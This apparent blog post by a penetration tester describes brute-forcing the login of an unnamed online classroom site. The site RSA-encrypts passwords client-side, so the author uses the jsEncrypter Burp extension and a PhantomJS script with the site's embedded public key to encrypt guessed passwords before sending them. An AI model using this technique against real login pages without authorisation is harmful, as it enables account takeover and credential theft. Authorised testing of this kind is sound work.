---
title: 某云课堂RSA加密登陆爆破小记
categories:
  - 技术水文
copyright: true
abbrlink: c8e756ab
date: 2021-04-07 16:46:07
tags:
---

![](https://z3.ax1x.com/2021/04/10/cdNJ6P.png)
<!--more-->

​	某天，Leader随手甩了个目标，要对某课堂做测试。我xxx****，又是个开头登录页面的“破站”。

![image-20210405234326102](https://z3.ax1x.com/2021/07/11/WCNR4x.png)

没有验证码，祭出Burp Suite爆之！

然而，然而，password字段居然是加密的，现在开发的安全意识都这么“高”了吗？

![image-20210406234529785](https://z3.ax1x.com/2021/07/11/WCN4gO.png)

不想测这破站，只想摸鱼领个底薪，不测了，破站扔一边去.......

![image-20210406235105275](https://z3.ax1x.com/2021/07/11/WCNh8K.png)

几天后.......

>	Leader：站点测试怎么样了，报告发一下
>		
>	Me：额，快好了，正在整理报告了，稍后发。

![image-20210407001057926](https://z3.ax1x.com/2021/07/11/WCNoKe.png)

再度打开burpsuite重新看看那破站了，唉......

<hr />

​	粗略的瞄了瞄，登录功能上没有验证码，且无错误次数等限制，只是通过 jsRSA 加密算法把 password 字段加密，而且公钥存在于 HTML 代码中，那么可以本地调用其加密函数把 payloads加密后再发送，从而暴力猜解用户账号密码。

加密函数：

![image-20210405234444876](https://z3.ax1x.com/2021/07/11/WCN2U1.png)

#### 下载 实现加密的js脚本到本地

http://xxxxx.com/javascripts/jsrsasign-latest-all-min.js

#### 下载加密脚本/BurpSuite扩展以及Apache Maven

https://github.com/c0ny1/jsEncrypter

https://maven.apache.org/download.cgi

#### 编译插件jsEncrypter

```bash
mvn clean package -DskipTests
```

![image-20210406001927535](https://z3.ax1x.com/2021/07/11/WCNgER.png)

编译完后加载到Burp Suite中。

#### 编写phantomJS运行脚本

使用 `test/TestScript/RSA/jsEncrypter_rsa.js` 模板。将实现加密算法的js文件引入模板脚本，在模板脚本的 `js_encrypt` 函数体中完成对加密函数的调用。

`jsEncrypter_rsa.js`

```javascript
...............

// load js file
var wasSuccessful = phantom.injectJs('jsrsasign-latest-all-min.js');

//Processing function
function js_encrypt(payload){
	var newpayload;
	/**Write the code that calls the encryption function to encrypt here***/
	var prefix = "-----BEGIN PUBLIC KEY-----\n";
	var suffix = "\n-----END PUBLIC KEY-----";
	var key = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDzOIykY8AmZkoDPDL9zfgV48FKY1RcqWYj4YE/zzvNXDl8e7hnkNRNRHk3InE95ehk340iOumV+RJ9KdihoWKHqnSPH2wTxDdI2WFuI1FOfndL67fJliEHx9z6A7bfFUZZq9xuzoA/zPCZbLsfWfa2mbi96Qc1lI73kCa8sLmDwwIDAQAB";
	var publicKey = prefix + key + suffix;
	var pub = KEYUTIL.getKey(publicKey);

	// encrypt.setPublicKey(key);
	newpayload = KJUR.crypto.Cipher.encrypt(payload, pub);
	/**********************************************************/
	return newpayload;
}
..............
```

![image-20210405235300901](https://z3.ax1x.com/2021/07/11/WCN5vD.png)

#### 下载phantomJS并运行脚本

https://phantomjs.org/download.html

```bash
phantomJS.exe jsEncrypter_rsa.js
```

#### 拦截登录包暴力破解

删除 Cookie 字段，关联扩展jsEncrypter：

![image-20210406002807685](https://z3.ax1x.com/2021/07/11/WCN6b9.png)

整理报告，交差~

![image-20210406003542562](https://z3.ax1x.com/2021/07/11/WCNTDH.png)



(o゜▽゜)o☆[BINGO!] 又可以愉快的学(摸)习(鱼)了。

